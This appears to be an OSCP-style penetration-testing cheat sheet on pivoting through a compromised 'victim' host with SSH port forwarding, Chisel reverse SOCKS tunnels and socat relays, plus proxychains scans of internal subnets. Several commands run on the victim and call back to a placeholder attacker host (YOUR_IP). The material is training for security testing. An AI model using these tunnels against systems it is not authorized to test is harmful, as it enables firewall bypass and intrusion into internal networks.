### The Scenario

```
You (Attacker)  →  SSH into Victim  →  Service running on 127.0.0.1:PORT (victim)
                                        (not accessible from outside)
```

You want to **reach that internal service** from your attacker machine.

---

### 1. SSH Local Port Forwarding

**"Bring their port to my machine"**

bash

```bash
ssh -L 8080:127.0.0.1:80 user@victim
```

```
Your machine:8080  →  tunnel through SSH  →  victim:127.0.0.1:80
```

- You run this **from your attacker machine**
- Now browse `127.0.0.1:8080` on YOUR machine to hit the victim's internal service
- Best for: **web apps, databases running locally on victim**

---

### 2. SSH Remote Port Forwarding

**"Push their port to my machine"** (when you can't SSH in directly — victim SSHes out to you)

bash

```bash
# Run ON THE VICTIM machine
ssh -R 8080:127.0.0.1:80 attacker@YOUR_IP
```

```
Victim connects out → your machine:8080 → forwards back to victim:80
```

- Used when **victim can reach you but you can't SSH into victim**
- Now on your machine, `127.0.0.1:8080` hits victim's internal service
- Best for: **reverse shells, firewall bypass situations**

---

### 3. SSH Dynamic Port Forwarding (SOCKS Proxy)

**"Use victim as a proxy for the entire network"**

bash

```bash
ssh -D 1080 user@victim
```

```
Your machine → SOCKS5 proxy on :1080 → victim → any internal host/port
```

- Creates a **SOCKS5 proxy** — route ALL traffic through victim
- Use with `proxychains`:

bash

```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.10 ...
proxychains crackmapexec smb 192.168.1.0/24
```

- Best for: **pivoting into internal networks, scanning subnets behind victim**

---

### 4. Chisel — When SSH is Not Available

Chisel works over HTTP — useful when only port 80/443 is open or no SSH.

#### Local forward with Chisel

bash

```bash
# On YOUR machine (server)
./chisel server -p 9001 --reverse

# On VICTIM (client)
./chisel client YOUR_IP:9001 R:8080:127.0.0.1:80
```

```
Your machine:8080  ←  chisel tunnel  ←  victim:127.0.0.1:80
```

#### SOCKS proxy with Chisel (most useful for OSCP)

bash

```bash
# On YOUR machine
./chisel server -p 9001 --reverse

# On VICTIM
./chisel client YOUR_IP:9001 R:socks
```

- This creates a **SOCKS5 proxy on your machine at port 1080**
- Then use `proxychains` same as dynamic SSH forwarding
- Best for: **no SSH available, Windows victims, full network pivot**

---

### 5. Socat — Port Relay/Redirect

Socat is used **on intermediate hosts** to relay traffic — it's a pipe between two sockets.

#### Basic port relay

bash

```bash
# On VICTIM — relay your port 8080 to internal service
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```

```
You → victim:8080 → socat → victim:127.0.0.1:80
```

- You don't need SSH for this — just code execution on victim
- Best for: **relaying a port to make it externally accessible**

#### Pivot relay (reach a second internal host)

bash

```bash
# Victim relays traffic to a second internal machine
socat TCP-LISTEN:445,fork TCP:192.168.1.20:445
```

```
You → victim:445 → socat → internal host:445
```

- Best for: **when you need to reach a host that only victim can talk to**

---

### Decision Chart

```
Can you SSH into victim?
├── YES
│    ├── Need to access ONE service on victim locally?
│    │    └── SSH Local Port Forward (-L)  ✅
│    │
│    ├── Need to scan/attack the WHOLE internal network?
│    │    └── SSH Dynamic (-D) + proxychains  ✅
│    │
│    └── Victim needs to connect OUT to you?
│         └── SSH Remote Port Forward (-R)  ✅
│
└── NO (only shell/RCE, no SSH)
     ├── Can upload binaries?
     │    ├── Full pivot/SOCKS needed?
     │    │    └── Chisel (server on you, client on victim)  ✅
     │    │
     │    └── Simple port relay needed?
     │         └── Socat TCP relay  ✅
     │
     └── No binary upload, only commands?
          └── Socat one-liner or ssh -L if creds found  ✅
```

---

### Quick Reference Cheatsheet

|Tool|Direction|Use Case|
|---|---|---|
|`ssh -L`|Local → Victim|Access victim's local service from your machine|
|`ssh -R`|Victim → Local|Victim can't be SSHed into, pushes port to you|
|`ssh -D`|Local SOCKS|Full network pivot through victim|
|`chisel R:port`|Victim → Local|No SSH, access victim's service|
|`chisel R:socks`|Victim → Local SOCKS|No SSH, full network pivot|
|`socat LISTEN:fork`|Relay on victim|Expose/relay any port without SSH|

---

### Most Common OSCP Scenario

```
1. You have shell on victim
2. Internal service on 127.0.0.1:8080 (web app, SMB, WinRM)
3. Upload chisel to victim
4. Run chisel server --reverse on your kali
5. Run chisel client YOUR_IP:9001 R:8080:127.0.0.1:8080 on victim
6. Now hit 127.0.0.1:8080 on YOUR kali
```